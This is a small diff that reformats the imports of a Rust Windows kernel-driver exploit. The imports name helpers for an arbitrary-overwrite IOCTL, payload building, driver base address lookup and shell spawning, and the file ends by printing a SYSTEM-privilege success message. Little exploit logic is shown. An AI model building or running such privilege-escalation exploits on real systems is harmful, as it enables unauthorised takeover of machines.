@@ -1,9 +1,10 @@
-use std::{
-    ffi::c_void,
-    mem::size_of,
-};
+use std::{ffi::c_void, mem::size_of};
 
-use exploitation::{build_payload, get_driver_base_address, get_function_address_by_name, get_device_handle, DEVICE_NAME, IOCTL_ARBITRARY_OVERWRITE, send_io_control, trigger_payload, is_elevated, spawn_shell};
+use exploitation::{
+    build_payload, get_device_handle, get_driver_base_address, get_function_address_by_name,
+    is_elevated, send_io_control, spawn_shell, trigger_payload, DEVICE_NAME,
+    IOCTL_ARBITRARY_OVERWRITE,
+};
 
 #[derive(Debug, Clone, Copy)]
 pub struct WriteWhatWhere {
@@ -135,4 +136,3 @@ fn main() {
 
     println!("[+] W00TW00T NT AUTHORITY\\SYSTEM");
 }
-
